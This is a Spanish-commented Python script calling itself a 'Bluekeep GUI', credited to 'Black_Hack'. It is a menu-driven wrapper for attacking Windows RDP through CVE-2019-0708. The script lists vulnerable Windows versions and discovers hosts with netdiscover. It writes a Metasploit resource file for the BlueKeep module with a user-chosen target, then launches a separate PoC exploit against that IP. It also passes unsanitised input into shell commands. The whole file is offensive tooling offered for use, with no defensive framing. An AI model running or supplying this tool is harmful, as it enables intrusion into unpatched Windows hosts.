#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading, io

# Programador David soto noche
# Correo: Sotodelanoche@gmail.com
# Lenguaje Python3 scrispt 
# Fecha 19:04:2020:
# Nombre del programa : Special Bluekeep GUI
# Accion: explotacion servicios windows 2019
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("vulneravilidad")
print("Microsoft Windows 7 for 32-bit Systems SP1")
print("Microsoft Windows 7 for x64-based Systems SP1")
print("Microsoft Windows Server 2003")
print("Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1")
print("Microsoft Windows Server 2008 R2 for x64-based Systems SP1")
print("Microsoft Windows Server 2008 for 32-bit Systems SP2")
print("Microsoft Windows Server 2008 for Itanium-based Systems SP2")
print("Microsoft Windows Server 2008 for x64-based Systems SP2")
print("Microsoft Windows XP")
time.sleep(3)
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet -k -f /root/bluekeep/usr/font/cosmike "   		Smp_A" && figlet -k -f /root/bluekeep/usr/font/bulbhead " Bluekeep GUI"')
print("			  	   Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:","1--visualiza ip","2--Configuracion bulekeep" ,"3--explotacion", "4--exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def ver_ip():
	os.system('x-terminal-emulator -e netdiscover')
	#subprocess.call('x-terminal-emulator -e netdiscover', shell=True)	
def configuracion():
	global ip_host
	global port
	ip_host=input("Introduzca ip host: ")
	port=input("Introduzca ip host default 3389: ")
	return ip_host, port

def comprobacion_explotacion(ip_host, port):
	print("configurando MsFcOnSoLe")
	print(ip_host)
	print(port)
	os.system('touch usr/configrc/exploid.rc')
	file = open("usr/configrc/exploid.rc","a")
	file.write('msfconsole'+'\n')
	file.write('use auxiliary/scanner/rdp/cve_2019_0708_bluekeep'+'\n')
	file.write('set RDP_CLIENT_NAME UNSET'+'\n')
	file.write('set RHOSTS '+ip_host+'\n')
	file.write('set RPORT '+port+'\n')
	file.write('run'+'\n')
	time.sleep(1)
	os.system('x-terminal-emulator -e msfconsole -r usr/configrc/exploid.rc')	
def ataque(ip_host):	
	os.system('x-terminal-emulator -e python usr/CVE/PoC.py '+ip_host+' 64')

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU DE EJECUCION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		ver_ip()
	elif (key==2):
		configuracion()
		time.sleep(1)
		comprobacion_explotacion(ip_host, port)
	elif (key==3):		
		ataque(ip_host)
	elif (key==4):		
		exit=True	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$